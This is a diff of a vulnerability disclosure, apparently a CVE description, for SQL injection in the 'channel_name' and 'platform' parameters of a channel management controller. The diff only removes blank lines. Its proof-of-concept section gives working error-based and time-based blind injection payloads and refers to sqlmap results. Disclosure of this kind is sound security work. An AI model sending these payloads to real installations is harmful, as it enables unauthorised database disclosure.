@@ -12,7 +12,6 @@ Affected Version : <= 0.8.0
 The string  of the 'channel_name' and 'platform' parameter transmission is completely without check and filter,so if the string is passed, it will lead to the existence of SQL injection vulnerability,This could result in full information disclosure.
 
 Code source:  
-
 /application/controllers/manage/channel.php at line 75-95
 ```
     /**
@@ -61,22 +60,17 @@ channel_name=test&platform=1%22
 ## Proof of Concept ##  
 
 The SQL injection type: error-based and AND/OR time-based blind  
-
 Parameter: channel_name,platform
-
 Payload(This string is also applied to 'platform' at the same time):  
 ```
 1.channel_name=test" AND (SELECT 1700 FROM(SELECT COUNT(*),CONCAT(0x7171706b71,(SELECT (ELT(1700=1700,1))),0x71786a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- JQon&platform=1
 2.channel_name=test" AND SLEEP(5)-- NklJ&platform=1
 ```
 Input special characters ["] can cause an error in the SQL syntax:  
-
 ![image](https://github.com/Kyhvedn/CVE_Description/blob/master/sql_1.png)  
 Use manual injection:  
-
 ![image](https://github.com/Kyhvedn/CVE_Description/blob/master/sql_2.png)
 SQLmap results:  
-
 ![image](https://github.com/Kyhvedn/CVE_Description/blob/master/sql_3.png)
 ![image](https://github.com/Kyhvedn/CVE_Description/blob/master/sql_4.png)
 
